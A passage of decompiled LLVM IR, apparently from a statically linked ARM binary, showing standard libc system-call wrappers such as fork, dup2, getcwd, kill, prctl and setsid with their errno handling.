dec_label_pc_11c34:                               ; preds = %dec_label_pc_11c20, %dec_label_pc_11c08, %dec_label_pc_11c00
  %storemerge = phi i32 [ %v0_11c00, %dec_label_pc_11c00 ], [ %v2_11c10, %dec_label_pc_11c08 ], [ -1, %dec_label_pc_11c20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11c10, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_11c64 = load i32, i32* @r0, align 4
  store i32 %v0_11c64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11c64, -4095
  br i1 %tmp, label %dec_label_pc_11c80, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %entry
  %v0_11c70 = call i32 @__errno_location()
  %v0_11c74 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c74 = sub i32 0, %v0_11c74
  %v2_11c78 = inttoptr i32 %v0_11c70 to i32*
  store i32 %v1_11c74, i32* %v2_11c78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %entry, %dec_label_pc_11c70
  %v0_11c80 = phi i32 [ %v0_11c64, %entry ], [ -1, %dec_label_pc_11c70 ]
  ret i32 %v0_11c80

; uselistorder directives
  uselistorder i32 %v0_11c64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c80, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11cbc = load i32, i32* @r4, align 4
  store i32 %v3_11cbc, i32* %stack_var_-8, align 4
  %v0_11cc0 = call i32 @chdir()
  store i32 %v0_11cc0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11cc0, -4095
  br i1 %tmp, label %dec_label_pc_11ce0, label %dec_label_pc_11cd0

dec_label_pc_11cd0:                               ; preds = %entry
  %v0_11cd0 = call i32 @__errno_location()
  %v0_11cd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_11cd4 = sub i32 0, %v0_11cd4
  %v2_11cd8 = inttoptr i32 %v0_11cd0 to i32*
  store i32 %v1_11cd4, i32* %v2_11cd8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %entry, %dec_label_pc_11cd0
  %v0_11ce0 = phi i32 [ %v0_11cc0, %entry ], [ -1, %dec_label_pc_11cd0 ]
  %v2_11ce4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11ce4, i32* @r4, align 4
  ret i32 %v0_11ce0

; uselistorder directives
  uselistorder i32 %v0_11cc0, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_11ce0, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ce8 = load i32, i32* @r4, align 4
  store i32 %v3_11ce8, i32* %stack_var_-8, align 4
  %v1_11cec = call i32 @close(i32 %arg1)
  store i32 %v1_11cec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_11cec, -4095
  br i1 %tmp, label %dec_label_pc_11d0c, label %dec_label_pc_11cfc

dec_label_pc_11cfc:                               ; preds = %entry
  %v0_11cfc = call i32 @__errno_location()
  %v0_11d00 = load i32, i32* %r4.global-to-local, align 4
  %v1_11d00 = sub i32 0, %v0_11d00
  %v2_11d04 = inttoptr i32 %v0_11cfc to i32*
  store i32 %v1_11d00, i32* %v2_11d04, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d0c

dec_label_pc_11d0c:                               ; preds = %entry, %dec_label_pc_11cfc
  %v0_11d0c = phi i32 [ %v1_11cec, %entry ], [ -1, %dec_label_pc_11cfc ]
  %v2_11d10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d10, i32* @r4, align 4
  ret i32 %v0_11d0c

; uselistorder directives
  uselistorder i32 %v1_11cec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d0c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d14 = load i32, i32* @r4, align 4
  store i32 %v3_11d14, i32* %stack_var_-8, align 4
  %v0_11d18 = call i32 @dup2()
  store i32 %v0_11d18, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d18, -4095
  br i1 %tmp, label %dec_label_pc_11d38, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %entry
  %v0_11d28 = call i32 @__errno_location()
  %v0_11d2c = load i32, i32* %r4.global-to-local, align 4
  %v1_11d2c = sub i32 0, %v0_11d2c
  %v2_11d30 = inttoptr i32 %v0_11d28 to i32*
  store i32 %v1_11d2c, i32* %v2_11d30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d38

dec_label_pc_11d38:                               ; preds = %entry, %dec_label_pc_11d28
  %v0_11d38 = phi i32 [ %v0_11d18, %entry ], [ -1, %dec_label_pc_11d28 ]
  %v2_11d3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d3c, i32* @r4, align 4
  ret i32 %v0_11d38

; uselistorder directives
  uselistorder i32 %v0_11d18, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11d38, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d40 = load i32, i32* @r4, align 4
  store i32 %v3_11d40, i32* %stack_var_-8, align 4
  %v0_11d44 = call i32 @fork()
  store i32 %v0_11d44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d44, -4095
  br i1 %tmp, label %dec_label_pc_11d64, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %entry
  %v0_11d54 = call i32 @__errno_location()
  %v0_11d58 = load i32, i32* %r4.global-to-local, align 4
  %v1_11d58 = sub i32 0, %v0_11d58
  %v2_11d5c = inttoptr i32 %v0_11d54 to i32*
  store i32 %v1_11d58, i32* %v2_11d5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %entry, %dec_label_pc_11d54
  %v0_11d64 = phi i32 [ %v0_11d44, %entry ], [ -1, %dec_label_pc_11d54 ]
  %v2_11d68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d68, i32* @r4, align 4
  ret i32 %v0_11d64

; uselistorder directives
  uselistorder i32 %v0_11d44, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_11d64, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_11d6c = load i32, i32* @r4, align 4
  store i32 %v3_11d6c, i32* %stack_var_-20, align 4
  %v6_11d6c = load i32, i32* @r5, align 4
  %v9_11d6c = load i32, i32* @r6, align 4
  %v12_11d6c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_11d70 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_11d7c = icmp eq i32 %arg1, 0
  br i1 %v2_11d70, label %dec_label_pc_11d7c, label %dec_label_pc_11dac

dec_label_pc_11d7c:                               ; preds = %entry
  br i1 %v2_11d7c, label %dec_label_pc_11d98, label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d7c
  %v0_11d84 = call i32 @__errno_location()
  %v0_11d88 = load i32, i32* @r7, align 4
  store i32 %v0_11d88, i32* @r5, align 4
  %v2_11d90 = inttoptr i32 %v0_11d84 to i32*
  store i32 22, i32* %v2_11d90, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d7c
  %v0_11d98 = call i32 @__GI_getpagesize()
  %v5_11da0 = icmp slt i32 %v0_11d98, 4096
  br i1 %v5_11da0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_11d98
  store i32 %v0_11d98, i32* @r4, align 4
  br label %dec_label_pc_11dbc

bb15:                                             ; preds = %dec_label_pc_11d98
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_11dbc

dec_label_pc_11dac:                               ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_11d7c, label %dec_label_pc_11dbc, label %bb16

bb16:                                             ; preds = %dec_label_pc_11dac
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dbc:                               ; preds = %dec_label_pc_11dac, %bb, %bb15
  %v0_11dbc = phi i32 [ %v0_11d98, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_11dac ]
  %v1_11dc0 = call i32 @malloc(i32 %v0_11dbc)
  store i32 %v1_11dc0, i32* @r6, align 4
  %v2_11dc4 = icmp eq i32 %v1_11dc0, 0
  br i1 %v2_11dc4, label %dec_label_pc_11e38, label %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge

dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge:  ; preds = %dec_label_pc_11dbc
  %v0_11dcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11dcc

dec_label_pc_11dcc:                               ; preds = %bb16, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge
  %v0_11dd0 = phi i32 [ %v1_11dc0, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge ], [ %arg1, %bb16 ]
  %v0_11dcc = phi i32 [ %v0_11dcc.pre, %dec_label_pc_11dbc.dec_label_pc_11dcc_crit_edge ], [ %arg2, %bb16 ]
  %v2_11dd4 = call i32 @getcwd(i32 %v0_11dd0, i32 %v0_11dcc)
  store i32 %v2_11dd4, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_11dd4, -4095
  br i1 %tmp, label %dec_label_pc_11df4, label %dec_label_pc_11de4

dec_label_pc_11de4:                               ; preds = %dec_label_pc_11dcc
  %v0_11de4 = call i32 @__errno_location()
  %v0_11de8 = load i32, i32* @r4, align 4
  %v1_11de8 = sub i32 0, %v0_11de8
  %v2_11dec = inttoptr i32 %v0_11de4 to i32*
  store i32 %v1_11de8, i32* %v2_11dec, align 4
  br label %dec_label_pc_11e24

dec_label_pc_11df4:                               ; preds = %dec_label_pc_11dcc
  %v1_11df4 = icmp slt i32 %v2_11dd4, 0
  br i1 %v1_11df4, label %dec_label_pc_11e24, label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11df4
  %v0_11dfc = load i32, i32* @r5, align 4
  %v2_11dfc = icmp eq i32 %v0_11dfc, 0
  br i1 %v2_11dfc, label %bb17, label %dec_label_pc_11e18.thread7

dec_label_pc_11e18.thread7:                       ; preds = %dec_label_pc_11dfc
  br label %dec_label_pc_11e3c

bb17:                                             ; preds = %dec_label_pc_11dfc
  %v1_11e00 = load i32, i32* @r7, align 4
  %v3_11e00 = icmp eq i32 %v1_11e00, 0
  br i1 %v3_11e00, label %dec_label_pc_11e18, label %dec_label_pc_11e18.thread

dec_label_pc_11e18.thread:                        ; preds = %bb17
  br label %bb18

dec_label_pc_11e18:                               ; preds = %bb17
  %v0_11e0c = load i32, i32* @r6, align 4
  %v2_11e10 = call i32 @realloc(i32 %v0_11e0c, i32 %v2_11dd4)
  store i32 %v2_11e10, i32* @r5, align 4
  %v2_11e18 = icmp eq i32 %v2_11e10, 0
  br i1 %v2_11e18, label %bb18, label %dec_label_pc_11e3c

bb18:                                             ; preds = %dec_label_pc_11e18.thread, %dec_label_pc_11e18
  %v1_11e1c = load i32, i32* @r6, align 4
  store i32 %v1_11e1c, i32* @r5, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e24:                               ; preds = %dec_label_pc_11df4, %dec_label_pc_11de4
  %v0_11e24 = load i32, i32* @r5, align 4
  %v2_11e24 = icmp eq i32 %v0_11e24, 0
  br i1 %v2_11e24, label %dec_label_pc_11e2c, label %dec_label_pc_11e38

dec_label_pc_11e2c:                               ; preds = %dec_label_pc_11e24
  %v0_11e2c = load i32, i32* @r6, align 4
  store i32 %v0_11e2c, i32* @r0, align 4
  %v0_11e30 = call i32 @free()
  br label %dec_label_pc_11e3c

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e24, %dec_label_pc_11dbc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e18.thread7, %bb18, %dec_label_pc_11e18, %dec_label_pc_11e2c, %dec_label_pc_11d84, %dec_label_pc_11e38
  %v0_11e3c = load i32, i32* @r5, align 4
  %v2_11e40 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11e40, i32* @r4, align 4
  store i32 %v6_11d6c, i32* @r5, align 4
  store i32 %v9_11d6c, i32* @r6, align 4
  store i32 %v12_11d6c, i32* @r7, align 4
  ret i32 %v0_11e3c

; uselistorder directives
  uselistorder i32 %v2_11dd4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11d98, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_11e3c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_11dcc, { 1, 0 }
  uselistorder label %dec_label_pc_11dbc, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_11e48 = ptrtoint i32* %stack_var_-12 to i32
  %v2_11e54 = call i32 @getrlimit(i32 7, i32 %v2_11e48)
  %v1_11e58 = icmp slt i32 %v2_11e54, 0
  br i1 %v1_11e58, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_11e60 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11e68 = phi i32 [ 256, %entry ], [ %v5_11e60, %bb ]
  ret i32 %v5_11e68

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_11e70 = load i32, i32* @global_var_32b4c.985, align 4
  %v2_11e74 = icmp eq i32 %v2_11e70, 0
  br i1 %v2_11e74, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_11e7c = phi i32 [ %v2_11e70, %entry ], [ 4096, %bb ]
  ret i32 %v1_11e7c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e84 = load i32, i32* @r4, align 4
  store i32 %v3_11e84, i32* %stack_var_-8, align 4
  %v0_11e88 = call i32 @getpid()
  store i32 %v0_11e88, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e88, -4095
  br i1 %tmp, label %dec_label_pc_11ea8, label %dec_label_pc_11e98

dec_label_pc_11e98:                               ; preds = %entry
  %v0_11e98 = call i32 @__errno_location()
  %v0_11e9c = load i32, i32* %r4.global-to-local, align 4
  %v1_11e9c = sub i32 0, %v0_11e9c
  %v2_11ea0 = inttoptr i32 %v0_11e98 to i32*
  store i32 %v1_11e9c, i32* %v2_11ea0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11ea8

dec_label_pc_11ea8:                               ; preds = %entry, %dec_label_pc_11e98
  %v0_11ea8 = phi i32 [ %v0_11e88, %entry ], [ -1, %dec_label_pc_11e98 ]
  %v2_11eac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11eac, i32* @r4, align 4
  ret i32 %v0_11ea8

; uselistorder directives
  uselistorder i32 %v0_11e88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ea8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11eb0 = load i32, i32* @r4, align 4
  store i32 %v3_11eb0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11ed4, label %dec_label_pc_11ec4

dec_label_pc_11ec4:                               ; preds = %entry
  %v0_11ec4 = call i32 @__errno_location()
  %v0_11ec8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ec8 = sub i32 0, %v0_11ec8
  %v2_11ecc = inttoptr i32 %v0_11ec4 to i32*
  store i32 %v1_11ec8, i32* %v2_11ecc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11ed8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %entry, %dec_label_pc_11ec4
  %v2_11ed8 = phi i32 [ %v3_11eb0, %entry ], [ %v2_11ed8.pre, %dec_label_pc_11ec4 ]
  %v0_11ed4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_11ec4 ]
  store i32 %v2_11ed8, i32* @r4, align 4
  ret i32 %v0_11ed4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ed4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_11ef8 = load i32, i32* @r0, align 4
  %v3_11ef8 = call i32 @ioctl(i32 %v0_11ef8, i32 %arg1, i32 %arg2)
  store i32 %v3_11ef8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_11ef8, -4095
  br i1 %tmp, label %dec_label_pc_11f18, label %dec_label_pc_11f08

dec_label_pc_11f08:                               ; preds = %entry
  %v0_11f08 = call i32 @__errno_location()
  %v0_11f0c = load i32, i32* %r4.global-to-local, align 4
  %v1_11f0c = sub i32 0, %v0_11f0c
  %v2_11f10 = inttoptr i32 %v0_11f08 to i32*
  store i32 %v1_11f0c, i32* %v2_11f10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11f18

dec_label_pc_11f18:                               ; preds = %entry, %dec_label_pc_11f08
  %v0_11f18 = phi i32 [ %v3_11ef8, %entry ], [ -1, %dec_label_pc_11f08 ]
  ret i32 %v0_11f18

; uselistorder directives
  uselistorder i32 %v3_11ef8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f18, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11f2c = load i32, i32* @r4, align 4
  store i32 %v3_11f2c, i32* %stack_var_-8, align 4
  %v0_11f30 = call i32 @kill()
  store i32 %v0_11f30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11f30, -4095
  br i1 %tmp, label %dec_label_pc_11f50, label %dec_label_pc_11f40

dec_label_pc_11f40:                               ; preds = %entry
  %v0_11f40 = call i32 @__errno_location()
  %v0_11f44 = load i32, i32* %r4.global-to-local, align 4
  %v1_11f44 = sub i32 0, %v0_11f44
  %v2_11f48 = inttoptr i32 %v0_11f40 to i32*
  store i32 %v1_11f44, i32* %v2_11f48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11f50

dec_label_pc_11f50:                               ; preds = %entry, %dec_label_pc_11f40
  %v0_11f50 = phi i32 [ %v0_11f30, %entry ], [ -1, %dec_label_pc_11f40 ]
  %v2_11f54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11f54, i32* @r4, align 4
  ret i32 %v0_11f50

; uselistorder directives
  uselistorder i32 %v0_11f30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f50, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_11f68 = and i32 %arg2, 64
  %v2_11f68 = icmp eq i32 %v1_11f68, 0
  br i1 %v2_11f68, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_11f58 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_11f58, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_11f78 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_11f78, i32* @r2, align 4
  %v4_11f80 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_11f84 = icmp eq i32 %v4_11f80, -4096
  store i1 %v7_11f84, i1* @cpsr_z, align 1
  store i32 %v4_11f80, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_11f80, -4095
  br i1 %tmp, label %dec_label_pc_11fa0, label %dec_label_pc_11f90

dec_label_pc_11f90:                               ; preds = %.thread1
  %v0_11f90 = call i32 @__errno_location()
  %v0_11f94 = load i32, i32* %r4.global-to-local, align 4
  %v1_11f94 = sub i32 0, %v0_11f94
  %v2_11f98 = inttoptr i32 %v0_11f90 to i32*
  store i32 %v1_11f94, i32* %v2_11f98, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11fa0

dec_label_pc_11fa0:                               ; preds = %.thread1, %dec_label_pc_11f90
  %v0_11fa0 = phi i32 [ %v4_11f80, %.thread1 ], [ -1, %dec_label_pc_11f90 ]
  ret i32 %v0_11fa0

; uselistorder directives
  uselistorder i32 %v4_11f80, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11fa0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_11fbc = load i32, i32* @r0, align 4
  %v2_11fbc = inttoptr i32 %v0_11fbc to i8*
  %v3_11fbc = call i32 @__libc_open(i8* %v2_11fbc, i32 577)
  %v0_11fc0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11fc0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_11fc0 = and i32 %v3_11fbc, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_11fc0 = phi i32 [ %v3_11fbc, %entry ], [ %v6_11fc0, %bb ]
  ret i32 %v7_11fc0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11fc4 = load i32, i32* @r4, align 4
  store i32 %v3_11fc4, i32* %stack_var_-8, align 4
  %v1_11fc8 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_11fc8 = call i32 @pipe([2 x i32] %v1_11fc8)
  store i32 %v2_11fc8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11fc8, -4095
  br i1 %tmp, label %dec_label_pc_11fe8, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %entry
  %v0_11fd8 = call i32 @__errno_location()
  %v0_11fdc = load i32, i32* %r4.global-to-local, align 4
  %v1_11fdc = sub i32 0, %v0_11fdc
  %v2_11fe0 = inttoptr i32 %v0_11fd8 to i32*
  store i32 %v1_11fdc, i32* %v2_11fe0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11fe8

dec_label_pc_11fe8:                               ; preds = %entry, %dec_label_pc_11fd8
  %v0_11fe8 = phi i32 [ %v2_11fc8, %entry ], [ -1, %dec_label_pc_11fd8 ]
  %v2_11fec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11fec, i32* @r4, align 4
  ret i32 %v0_11fe8

; uselistorder directives
  uselistorder i32 %v2_11fc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11fe8, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ff0 = load i32, i32* @r4, align 4
  store i32 %v3_11ff0, i32* %stack_var_-8, align 4
  %v0_11ff8 = call i32 @prctl()
  store i32 %v0_11ff8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ff8, -4095
  br i1 %tmp, label %dec_label_pc_12018, label %dec_label_pc_12008

dec_label_pc_12008:                               ; preds = %entry
  %v0_12008 = call i32 @__errno_location()
  %v0_1200c = load i32, i32* %r4.global-to-local, align 4
  %v1_1200c = sub i32 0, %v0_1200c
  %v2_12010 = inttoptr i32 %v0_12008 to i32*
  store i32 %v1_1200c, i32* %v2_12010, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12018

dec_label_pc_12018:                               ; preds = %entry, %dec_label_pc_12008
  %v0_12018 = phi i32 [ %v0_11ff8, %entry ], [ -1, %dec_label_pc_12008 ]
  %v2_1201c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1201c, i32* @r4, align 4
  ret i32 %v0_12018

; uselistorder directives
  uselistorder i32 %v0_11ff8, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_12018, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12020 = load i32, i32* @r4, align 4
  store i32 %v3_12020, i32* %stack_var_-8, align 4
  %v1_12024 = load i32, i32* @r1, align 4
  %v2_12024 = inttoptr i32 %v1_12024 to i32*
  %v3_12024 = load i32, i32* @r2, align 4
  %v4_12024 = call i32 @read(i32 %arg1, i32* %v2_12024, i32 %v3_12024)
  store i32 %v4_12024, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12024, -4095
  br i1 %tmp, label %dec_label_pc_12044, label %dec_label_pc_12034

dec_label_pc_12034:                               ; preds = %entry
  %v0_12034 = call i32 @__errno_location()
  %v0_12038 = load i32, i32* %r4.global-to-local, align 4
  %v1_12038 = sub i32 0, %v0_12038
  %v2_1203c = inttoptr i32 %v0_12034 to i32*
  store i32 %v1_12038, i32* %v2_1203c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %entry, %dec_label_pc_12034
  %v0_12044 = phi i32 [ %v4_12024, %entry ], [ -1, %dec_label_pc_12034 ]
  %v2_12048 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12048, i32* @r4, align 4
  ret i32 %v0_12044

; uselistorder directives
  uselistorder i32 %v4_12024, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12044, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1204c = load i32, i32* @r4, align 4
  store i32 %v3_1204c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12074, label %dec_label_pc_12064

dec_label_pc_12064:                               ; preds = %entry
  %v0_12064 = call i32 @__errno_location()
  %v0_12068 = load i32, i32* %r4.global-to-local, align 4
  %v1_12068 = sub i32 0, %v0_12068
  %v2_1206c = inttoptr i32 %v0_12064 to i32*
  store i32 %v1_12068, i32* %v2_1206c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12078.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12074

dec_label_pc_12074:                               ; preds = %entry, %dec_label_pc_12064
  %v2_12078 = phi i32 [ %v3_1204c, %entry ], [ %v2_12078.pre, %dec_label_pc_12064 ]
  %v0_12074 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12064 ]
  store i32 %v2_12078, i32* @r4, align 4
  ret i32 %v0_12074

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12074, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1207c = load i32, i32* @r4, align 4
  store i32 %v3_1207c, i32* %stack_var_-8, align 4
  %v0_12080 = call i32 @setsid()
  store i32 %v0_12080, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12080, -4095
  br i1 %tmp, label %dec_label_pc_120a0, label %dec_label_pc_12090

dec_label_pc_12090:                               ; preds = %entry
  %v0_12090 = call i32 @__errno_location()
  %v0_12094 = load i32, i32* %r4.global-to-local, align 4
  %v1_12094 = sub i32 0, %v0_12094
  %v2_12098 = inttoptr i32 %v0_12090 to i32*
  store i32 %v1_12094, i32* %v2_12098, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %entry, %dec_label_pc_12090
  %v0_120a0 = phi i32 [ %v0_12080, %entry ], [ -1, %dec_label_pc_12090 ]
